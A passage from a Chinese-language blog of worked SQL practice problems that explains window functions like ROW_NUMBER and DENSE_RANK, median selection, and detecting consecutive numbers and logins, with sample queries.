NULL,<br><code>last_name</code> varchar(16) NOT NULL,<br><code>gender</code> char(1) NOT NULL,<br><code>hire_date</code> date NOT NULL,</p><p>PRIMARY KEY (<code>emp_no</code>));</p><p>如，输入为：</p><p>INSERT INTO employees VALUES(10001,’1953-09-02’,’Georgi’,’Facello’,’M’,’1986-06-26’);<br>INSERT INTO employees VALUES(10002,’1964-06-02’,’Bezalel’,’Simmel’,’F’,’1985-11-21’);<br>INSERT INTO employees VALUES(10005,’1955-01-21’,’Kyoichi’,’Maliniak’,’M’,’1989-09-12’);<br>INSERT INTO employees VALUES(10006,’1953-04-20’,’Anneke’,’Preusig’,’F’,’1989-06-02’);</p><p>输出格式:</p><table><thead><tr><th align="left">first_name</th></tr></thead><tbody><tr><td align="left">Georgi</td></tr><tr><td align="left">Anneke</td></tr></tbody></table><p>因为Georgi按first_name排名为3，Anneke按first_name排名为1，所以会输出这2个，且输出时不需排序。</p></blockquote><p>先不看题目描述的最后一行（因为Georgi按first_name排名为3，Anneke按first_name排名为1，所以会输出这2个，且输出时不需排序。）</p><p>这种情况用开窗函数<code>ROW_NUMBER() OVER(ORDER BY 排序字段名)</code>先得到一个有序号的字段，然后将这个表作为子查询结果（因为最终结果不要ROW_NUMBER() OVER( )得到的这个字段），只保留first_name这个字段，并且加上WHERE条件筛选出奇数行，SQL语句如下（由里到外看）：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name <span class="hljs-keyword">FROM</span> ( <span class="hljs-keyword">SELECT</span> first_name,ROW_NUMBER() <span class="hljs-keyword">OVER</span> (<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> first_name) <span class="hljs-keyword">AS</span> rs    <span class="hljs-keyword">FROM</span> employees) a <span class="hljs-keyword">WHERE</span> rs % <span class="hljs-number">2</span> = <span class="hljs-number">1</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> first_name</code></pre></div><p>OK，如果没有题目的最后一行描述，那么已经大功告成了，但是事情并没有那么简单。</p><p>当加上最后一行的题目描述，我们需要结果是原来插入的那个顺序输出，所以不能是开窗函数排序后的结果那样输出。</p><ul><li>方法一（套娃）</li></ul><p>思路：因为排序需要用原表的顺序，所以总体思路是最后还是FROM 原表，也就是<code>FROM employees</code></p><p>在上述的基础上，我们将筛选得到的first_name字段用在WHERE语句上再嵌套一层，用<code>WHERE 字段名 IN</code>的方法实现，SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name <span class="hljs-keyword">FROM</span> employees<span class="hljs-keyword">WHERE</span> first_name <span class="hljs-keyword">IN</span> (    <span class="hljs-keyword">SELECT</span> first_name <span class="hljs-keyword">FROM</span> (     <span class="hljs-keyword">SELECT</span> first_name,ROW_NUMBER() <span class="hljs-keyword">OVER</span> (<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> first_name) <span class="hljs-keyword">AS</span> rs        <span class="hljs-keyword">FROM</span> employees    ) a     <span class="hljs-keyword">WHERE</span> rs % <span class="hljs-number">2</span> = <span class="hljs-number">1</span>    <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> first_name)</code></pre></div><p>简单粗暴哈哈哈</p><ul><li><p>方法二（表连接）</p><p><a href="https://blog.nowcoder.net/n/ec78e0fb848b46f4b7d431775ca41b9b?f=comment" target="_blank" rel="noopener">牛客用户：77栗子松糕</a></p><p>本质上都一样（都是from原表），只是这里将子查询作为一个表来与原表连接了</p></li></ul><h4 id="SQL63-刷题通过的题目排名（中等）"><a href="#SQL63-刷题通过的题目排名（中等）" class="headerlink" title="SQL63 刷题通过的题目排名（中等）"></a><a href="https://www.nowcoder.com/practice/cd2e10a588dc4c1db0407d0bf63394f3?tpId=82&amp;&amp;tqId=35080&amp;rp=1&amp;ru=/ta/sql&amp;qru=/ta/sql/question-ranking" target="_blank" rel="noopener"><strong>SQL63</strong> <strong>刷题通过的题目排名</strong></a>（中等）</h4><blockquote><p>描述</p><p>在牛客刷题有一个通过题目个数的(passing_number)表，id是主键，简化如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20200813/557336_1597308916086_6B7E692D15E9D27D855F76C56E00D52A" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示id为1的用户通过了4个题目;…..第6行表示id为6的用户通过了4个题目;请你根据上表，输出通过的题目的排名，通过题目个数相同的，排名相同，此时按照id升序排列，数据如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20201105/557336_1604558013211_15EB7DEE744C7810B57ED3EF3D65D7FE" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>id为5的用户通过了5个排名第1，id为1和id为6的都通过了2个，并列第2</p></blockquote><p>这题与普通的排序题类似，不一样的是这里的排名有重复的，所以不能用<code>row_number()</code>函数，需要用<code>dense_rank()</code>函数，直接<code>DENSE_RANK() OVER(ORDER BY number DESC)</code>将number降序排序（即number值大的排序序号较小），SQL实现如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,<span class="hljs-built_in">number</span>,<span class="hljs-keyword">DENSE_RANK</span>() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">DESC</span>) <span class="hljs-keyword">AS</span> t_rank <span class="hljs-keyword">FROM</span> passing_number<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> t_rank,<span class="hljs-keyword">id</span></code></pre></div><blockquote><p>拓展</p><p><a href="https://www.cnblogs.com/qiuting/p/7880500.html" target="_blank" rel="noopener">row_number()、rank()、dense_rank() 的区别</a></p><p><strong>row_numbe</strong>r的用途非常广泛，排序最好用它，它会为查询出来的每一行记录生成一个序号，依次排序且不会重复，注意使用row_number函数时必须要用over子句选择对某一列进行排序才能生成序号。</p><p><strong>rank</strong>函数用于返回结果集的分区内每行的排名，行的排名是相关行之前的排名数加一。简单来说rank函数就是对查询出来的记录进行排名，与row_number函数不同的是，rank函数考虑到了over子句中排序字段值相同的情况，如果使用rank函数来生成序号，over子句中排序字段值相同的序号是一样的，后面字段值不相同的序号将跳过相同的排名号排下一个，也就是相关行之前的排名数加一，可以理解为根据当前的记录数生成序号，后面的记录依此类推。</p><p><strong>dense_rank</strong>函数的功能与rank函数类似，dense_rank函数在生成序号时是连续的，而rank函数生成的序号有可能不连续。dense_rank函数出现相同排名时，将不跳过相同排名号，rank值紧接上一次的rank值。在各个分组内，rank()是跳跃排序，有两个第一名时接下来就是第三名，dense_rank()是连续排序，有两个第一名时仍然跟着第二名。</p></blockquote><h4 id="SQL74-考试分数-三-（较难）"><a href="#SQL74-考试分数-三-（较难）" class="headerlink" title="SQL74 考试分数(三)（较难）"></a><a href="https://www.nowcoder.com/practice/b83f8b0e7e934d95a56c24f047260d91?tpId=82&amp;tags=&amp;title=&amp;difficulty=0&amp;judgeStatus=0&amp;rp=1" target="_blank" rel="noopener"><strong>SQL74</strong> <strong>考试分数(三)</strong></a>（较难）</h4><blockquote><p>描述</p><p>牛客每次举办企业笔试的时候，企业一般都会有不同的语言岗位，比如C++工程师，JAVA工程师，Python工程师，每个用户笔试完有不同的分数，现在有一个分数(grade)表简化如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20200817/557336_1597652427039_07E19104EBD63DA9EDB41F5DD4489F99" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示用户id为1的选择了language_id为1岗位的最后考试完的分数为12000，<br>….<br>第7行表示用户id为7的选择了language_id为2岗位的最后考试完的分数为11000，</p><p>不同的语言岗位(language)表简化如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20200817/557336_1597652437695_C8AFE1A16BE6BBA7929B73D79DE0E398" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>请你找出每个岗位分数排名前2名的用户，得到的结果先按照language的name升序排序，再按照积分降序排序，最后按照grade的id升序排序，得到结果如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20200817/557336_1597652444918_D40D8F8B37A92E9E7A15A5231F7D3822" srcset="/img/loading.gif" lazyload="" alt="img"></p></blockquote><p>思路：</p><ol><li><p>因为要筛选出前两名，所以还是用排序。从案例中来看，重复的也算入了前两名内，所以这里用于生成排序序号的函数应该用<code>DENSE_RANK()</code>（相同排名会生成相同排名号，连续；<code>RANK()</code>也是相同排名会生成相同排名号，但不连续）</p><blockquote><p>– 子查询（分组排序）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,language_id,score,<span class="hljs-keyword">DENSE_RANK</span>() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> language_id <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> score <span class="hljs-keyword">DESC</span>) <span class="hljs-keyword">AS</span> rs <span class="hljs-keyword">FROM</span> grade</code></pre></div></blockquote></li><li><p>表连接，WHERE过滤等</p></li></ol><p>完整SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> a.id,c.name,a.score <span class="hljs-keyword">FROM</span> grade a<span class="hljs-keyword">JOIN</span> (    <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,language_id,score,<span class="hljs-keyword">DENSE_RANK</span>() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> language_id <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> score <span class="hljs-keyword">DESC</span>) <span class="hljs-keyword">AS</span> rs    <span class="hljs-keyword">FROM</span> grade) b<span class="hljs-keyword">ON</span> a.id = b.id<span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">language</span> c<span class="hljs-keyword">ON</span> a.language_id = c.id<span class="hljs-keyword">WHERE</span> b.rs &lt;= <span class="hljs-number">2</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> c.name,a.score <span class="hljs-keyword">DESC</span>,a.id</code></pre></div><h4 id="SQL76-考试分数-五-（困难）"><a href="#SQL76-考试分数-五-（困难）" class="headerlink" title="SQL76 考试分数(五)（困难）"></a><a href="https://www.nowcoder.com/practice/b626ff9e2ad04789954c2132c74c0512?tpId=82&amp;tags=&amp;title=&amp;difficulty=0&amp;judgeStatus=0&amp;rp=1" target="_blank" rel="noopener"><strong>SQL76</strong> <strong>考试分数(五)</strong></a>（困难）</h4><p><span id="NIUKE_SQL76">锚点：中位数</span></p><blockquote><p>描述</p><p>牛客每次考试完，都会有一个成绩表(grade)，如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210204/557336_1612434987195/17DF5669D7379DF505A49E7E33701DDF" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示用户id为1的用户选择了C++岗位并且考了11001分</p><p>。。。</p><p>第8行表示用户id为8的用户选择了B语言岗位并且考了9999分</p><p>请你写一个sql语句查询各个岗位分数的中位数位置上的所有grade信息，并且按id升序排序，结果如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210204/557336_1612435020053/E4B68B27A8EAB1FDC2576B68F209167D" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>解释：</p><p>第1行表示C++岗位的中位数位置上的为用户id为2，分数为10000，在C++岗位里面排名是第2</p><p>第2，3行表示Java岗位的中位数位置上的为用户id为4,5，分数为12000,13000，在Java岗位里面排名是第2,1</p><p>第4行表示B语言岗位的中位数位置上的为用户id为7，分数为11000，在前端岗位里面排名是第2</p><p>(注意: sqlite 1/2得到的不是0.5，得到的是0，只有1*1.0/2才会得到0.5，sqlite四舍五入的函数为round，sqlite不支持floor函数，支持cast(x as integer) 函数，不支持if函数，支持case when …then …else ..end函数，sqlite不支持自定义变量)</p></blockquote><p>方法：无限套娃~~</p><ol><li><p>是这题<a href="[考试分数(四"><strong>SQL75</strong> <strong>考试分数(四)</strong></a>_牛客题霸_牛客网 (nowcoder.com)](<a href="https://www.nowcoder.com/practice/502fb6e2b1ad4e56aa2e0dd90c6edf3c?tpId=82&amp;tags=&amp;title=&amp;difficulty=0&amp;judgeStatus=0&amp;rp=1))的进阶版本（这题要给出score是中位数的所有数据），还是先分组查询，但与（四）题不同的是，这里需要把中位数号合并，以下分别是单数、双数（双数有两个中位数）的情况，将其合并成(job,t_rank)两个字段的数据" target="_blank" rel="noopener">https://www.nowcoder.com/practice/502fb6e2b1ad4e56aa2e0dd90c6edf3c?tpId=82&amp;tags=&amp;title=&amp;difficulty=0&amp;judgeStatus=0&amp;rp=1))的进阶版本（这题要给出score是中位数的所有数据），还是先分组查询，但与（四）题不同的是，这里需要把中位数号合并，以下分别是单数、双数（双数有两个中位数）的情况，将其合并成(job,t_rank)两个字段的数据</a></p><blockquote><p>– 子查询（获取(job,t_rank)）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">IF</span>(<span class="hljs-keyword">num</span>%<span class="hljs-number">2</span>=<span class="hljs-number">1</span>,<span class="hljs-keyword">CEILING</span>(<span class="hljs-keyword">num</span>/<span class="hljs-number">2</span>),<span class="hljs-literal">null</span>) <span class="hljs-keyword">AS</span> t_rank<span class="hljs-keyword">FROM</span> (     <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> grade    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job) a<span class="hljs-keyword">UNION</span><span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">IF</span>(<span class="hljs-keyword">num</span>%<span class="hljs-number">2</span>=<span class="hljs-number">0</span>,<span class="hljs-keyword">num</span>/<span class="hljs-number">2</span>,<span class="hljs-literal">null</span>) <span class="hljs-keyword">AS</span> t_rank<span class="hljs-keyword">FROM</span> (     <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> grade    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job) a<span class="hljs-keyword">UNION</span><span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">IF</span>(<span class="hljs-keyword">num</span>%<span class="hljs-number">2</span>=<span class="hljs-number">0</span>,<span class="hljs-keyword">num</span>/<span class="hljs-number">2</span>+<span class="hljs-number">1</span>,<span class="hljs-literal">null</span>) <span class="hljs-keyword">AS</span> t_rank<span class="hljs-keyword">FROM</span> (     <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> grade    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job    ) a</code></pre></div></blockquote><p>（备注：<code>UNION</code>后面不能接<code>ORDER BY</code>）</p></li><li><p>去重，WHERE过滤</p><p>上面的子查询得到的数据里，还有null和重复的数据。所以外层再嵌套一个</p><blockquote><p>– 子查询（去重并过滤）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> job,<span class="hljs-keyword">ROUND</span>(t_rank,<span class="hljs-number">0</span>) <span class="hljs-keyword">FROM</span> (<span class="hljs-comment">-- 此前的三个子查询a</span> ) b <span class="hljs-keyword">WHERE</span> t_rank &lt;&gt; <span class="hljs-string">'NULL'</span></code></pre></div></blockquote></li><li><p>现在得到准确的(job,t_rank)格式了，那么对原表也用一次<code>ROW_NUMBER()</code>分组排序生成一个序号。都有(job,t_rank)，那么剩下就是老套的<code>WHERE 字段 IN</code>大法了</p><blockquote><p>– 子查询（再次套娃）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,job,score,t_rank <span class="hljs-keyword">FROM</span> ( <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,job,score,ROW_NUMBER() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> job <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> score <span class="hljs-keyword">DESC</span>) <span class="hljs-keyword">AS</span> t_rank <span class="hljs-keyword">FROM</span> grade) c<span class="hljs-keyword">WHERE</span> (job,t_rank) <span class="hljs-keyword">IN</span> (<span class="hljs-comment">-- 此前的子查询结果</span>)<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">id</span></code></pre></div></blockquote></li></ol><p>完整SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,job,score,t_rank <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,job,score,ROW_NUMBER() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> job <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> score <span class="hljs-keyword">DESC</span>) <span class="hljs-keyword">AS</span> t_rank    <span class="hljs-keyword">FROM</span> grade) c<span class="hljs-keyword">WHERE</span> (job,t_rank) <span class="hljs-keyword">IN</span> (    <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> job,<span class="hljs-keyword">ROUND</span>(t_rank,<span class="hljs-number">0</span>) <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">IF</span>(<span class="hljs-keyword">num</span>%<span class="hljs-number">2</span>=<span class="hljs-number">1</span>,<span class="hljs-keyword">CEILING</span>(<span class="hljs-keyword">num</span>/<span class="hljs-number">2</span>),<span class="hljs-literal">null</span>) <span class="hljs-keyword">AS</span> t_rank    <span class="hljs-keyword">FROM</span> (         <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> grade        <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job    ) a    <span class="hljs-keyword">UNION</span>    <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">IF</span>(<span class="hljs-keyword">num</span>%<span class="hljs-number">2</span>=<span class="hljs-number">0</span>,<span class="hljs-keyword">num</span>/<span class="hljs-number">2</span>,<span class="hljs-literal">null</span>) <span class="hljs-keyword">AS</span> t_rank    <span class="hljs-keyword">FROM</span> (         <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> grade        <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job    ) a    <span class="hljs-keyword">UNION</span>    <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">IF</span>(<span class="hljs-keyword">num</span>%<span class="hljs-number">2</span>=<span class="hljs-number">0</span>,<span class="hljs-keyword">num</span>/<span class="hljs-number">2</span>+<span class="hljs-number">1</span>,<span class="hljs-literal">null</span>) <span class="hljs-keyword">AS</span> t_rank    <span class="hljs-keyword">FROM</span> (         <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> grade        <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job        ) a    ) b    <span class="hljs-keyword">WHERE</span> t_rank &lt;&gt; <span class="hljs-string">'NULL'</span>)<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">id</span></code></pre></div><h2 id="连续"><a href="#连续" class="headerlink" title="连续"></a>连续</h2><h3 id="连续数字"><a href="#连续数字" class="headerlink" title="连续数字"></a>连续数字</h3><h4 id="180-连续出现的数字（中等）"><a href="#180-连续出现的数字（中等）" class="headerlink" title="180. 连续出现的数字（中等）"></a><a href="https://leetcode-cn.com/problems/consecutive-numbers/" target="_blank" rel="noopener"><strong>180. 连续出现的数字</strong></a>（中等）</h4><blockquote><p>表：Logs</p><p>+————-+———+<br>| Column Name | Type    |<br>+————-+———+<br>| id          | int     |<br>| num         | varchar |<br>+————-+———+<br>id 是这个表的主键。</p><p>编写一个 SQL 查询，查找所有至少连续出现三次的数字。</p><p>返回的结果表中的数据可以按 任意顺序 排列。</p><p>查询结果格式如下面的例子所示：</p><p>Logs 表：<br>+—-+—–+<br>| Id | Num |<br>+—-+—–+<br>| 1  | 1   |<br>| 2  | 1   |<br>| 3  | 1   |<br>| 4  | 2   |<br>| 5  | 1   |<br>| 6  | 2   |<br>| 7  | 2   |<br>+—-+—–+</p><p>Result 表：<br>+—————–+<br>| ConsecutiveNums |<br>+—————–+<br>| 1               |<br>+—————–+<br>1 是唯一连续出现至少三次的数字。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/consecutive-numbers" target="_blank" rel="noopener">https://leetcode-cn.com/problems/consecutive-numbers</a><br>著作权归领扣网络所有。</p></blockquote><p>这里因为id是连续的，所以可以利用id来作为判断是否连续的重要依据。</p><p>以第一行的id为基准，将第二行数据的id减1，第二行数据的id减2，这样三行数据的id都相同了</p><p>之后再以id为连接键进行表连接，当连接后的表里同一行的num都相同时，即该num是一个出现了连续三次的num</p><p>SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> a.num <span class="hljs-keyword">AS</span> ConsecutiveNums <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">logs</span> a<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span><span class="hljs-number">-1</span> <span class="hljs-keyword">AS</span> <span class="hljs-keyword">id</span>,<span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">logs</span>) b <span class="hljs-keyword">ON</span> a.id = b.id<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span><span class="hljs-number">-2</span> <span class="hljs-keyword">AS</span> <span class="hljs-keyword">id</span>,<span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">logs</span>) c <span class="hljs-keyword">ON</span> a.id = c.id<span class="hljs-keyword">WHERE</span> a.num = b.num<span class="hljs-keyword">AND</span> a.num = c.num</code></pre></div><h3 id="连续登录"><a href="#连续登录" class="headerlink" title="连续登录"></a>连续登录</h3><h4 id="连续登陆7天以上的用户-（困难）"><a href="#连续登陆7天以上的用户-（困难）" class="headerlink" title="连续登陆7天以上的用户 （困难）"></a><a href="https://www.cnblogs.com/ikww/p/12012831.html" target="_blank" rel="noopener"><strong>连续登陆7天以上的用户</strong> </a>（困难）</h4><blockquote><p>描述</p><p>表order，表结构如下：（分别是用户id和登录时间）</p><table><thead><tr><th>user_id</th><th>date</th></tr></thead><tbody><tr><td>int</td><td>datetime</td></tr></tbody></table><p>求连续登录七天的用户ID</p></blockquote><p>思路：</p><ol><li>按用户及日期去重</li><li>按用户为分区，以时间排序</li><li>将步骤2得到的序号与步骤1的时间相减</li><li>将步骤三得到的新字段以用户和差值分组并筛选单个分组大于7的用户id</li></ol><p>SQL实现：</p><ol><li><p>GROUP BY 分组并 DISTINCT 去重（因为每个用户每天的数据可能有很多）</p><blockquote><p>– 子查询（t1）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id,<span class="hljs-string">`date`</span></code></pre></div></blockquote></li><li><p>PARTITION BY 用户 ORDER BY 时间</p><blockquote><p>– 子查询（t2）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> *,ROW_NUMBER() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> user_id,<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-string">`date`</span>) <span class="hljs-keyword">AS</span> rs <span class="hljs-keyword">FROM</span> t1</code></pre></div></blockquote></li><li><p>相减</p><p>经过前面两个步骤操作后，对同一个用户，如果是连续登录的，那么他的<code>日期</code>和<code>rs</code>这两个字段应该都是以步长为1的等差数列。所以对连续登录的用户，将这个两个字段相减，会得到多行相同的数值，接下来先进行相减的操作：</p><blockquote><p>– 子查询（t3）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user_id,(t2.<span class="hljs-string">`date`</span> - t2.rs) <span class="hljs-keyword">AS</span> d <span class="hljs-keyword">FROM</span> t2</code></pre></div></blockquote></li><li><p>分组筛选</p><blockquote><p>– 最终步骤</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> t3<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id,d<span class="hljs-keyword">HAVING</span> <span class="hljs-keyword">COUNT</span>(*) &gt;= <span class="hljs-number">7</span></code></pre></div></blockquote></li></ol><p>完整SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user_id <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> user_id,(t2.<span class="hljs-string">`date`</span> - t2.rs) <span class="hljs-keyword">AS</span> d <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> *,ROW_NUMBER() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> user_id,<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-string">`date`</span>) <span class="hljs-keyword">AS</span> rs <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id,<span class="hljs-string">`date`</span>)) t2) t3<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id,d<span class="hljs-keyword">HAVING</span> <span class="hljs-keyword">COUNT</span>(*) &gt;= <span class="hljs-number">7</span></code></pre></div><h2 id="比例"><a href="#比例" class="headerlink" title="比例"></a>比例</h2><h4 id="SQL65-异常的邮件概率（较难）"><a href="#SQL65-异常的邮件概率（较难）" class="headerlink" title="SQL65 异常的邮件概率（较难）"></a><a href="https://www.nowcoder.com/practice/d6dd656483b545159d3aa89b4c26004e?tpId=82&amp;&amp;tqId=35083&amp;rp=1&amp;ru=/activity/oj&amp;qru=/ta/sql/question-ranking" target="_blank" rel="noopener"><strong>SQL65</strong> <strong>异常的邮件概率</strong></a>（较难）</h4><p>（题目很长，你忍一下）简单来说就统计每天正常用户对正常用户发送邮件失败的比例</p><blockquote><p>描述</p><p>现在有一个需求，让你统计正常用户发送给正常用户邮件失败的概率:<br>有一个邮件(email)表，id为主键， type是枚举类型，枚举成员为(completed，no_completed)，completed代表邮件发送是成功的，no_completed代表邮件是发送失败的。简况如下:<br><img src="https://uploadfiles.nowcoder.com/images/20200817/557336_1597652115615_43081841018939871F6352EF230E6D8E" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示为id为2的用户在2020-01-11成功发送了一封邮件给了id为3的用户;<br>…<br>第3行表示为id为1的用户在2020-01-11<strong>没有成功</strong>发送一封邮件给了id为4的用户;<br>…<br>第6行表示为id为4的用户在2020-01-12成功发送了一封邮件给了id为1的用户;</p><p>下面是一个用户(user)表，id为主键，is_blacklist为0代表为正常用户，is_blacklist为1代表为黑名单用户，简况如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20200817/557336_1597652932880_7440E658C1F32DF28A6F4360EAB2D9BB" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示id为1的是正常用户;<br>第2行表示id为2的不是正常用户，是黑名单用户，如果发送大量邮件或者出现各种情况就会容易发送邮件失败的用户<br>。。。<br>第4行表示id为4的是正常用户</p><p>现在让你写一个sql查询，每一个日期里面，正常用户发送给正常用户邮件失败的概率是多少，结果保留到小数点后面3位(3位之后的四舍五入)，并且按照日期升序排序，上面例子查询结果如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20200817/557336_1597652145337_6DF0297941EF626E9F6560F28F60E2C7" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>结果表示:</p><p>2020-01-11失败的概率为0.500，因为email的第1条数据，发送的用户id为2是黑名单用户，所以不计入统计，正常用户发正常用户总共2次，但是失败了1次，所以概率是0.500;</p><p>2020-01-12没有失败的情况，所以概率为0.000.<br>(注意: sqlite 1/2得到的不是0.5，得到的是0，只有1*1.0/2才会得到0.5，sqlite四舍五入的函数为round)</p></blockquote><p>因为题目要求的是每天的比例，所以显然需要用到<code>GROUP BY</code>函数对日期(date)进行分组，但是题目有一个<strong>正常用户对正常用户</strong>，因而我们先取出正常用户这部分。</p><p>通过<code>SELECT id FROM user WHERE is_blacklist = 0</code>筛选出正常用户id，那么还是用<code>WHERE 字段名 IN</code>的方法来实现筛选出 id正常的发送用户和 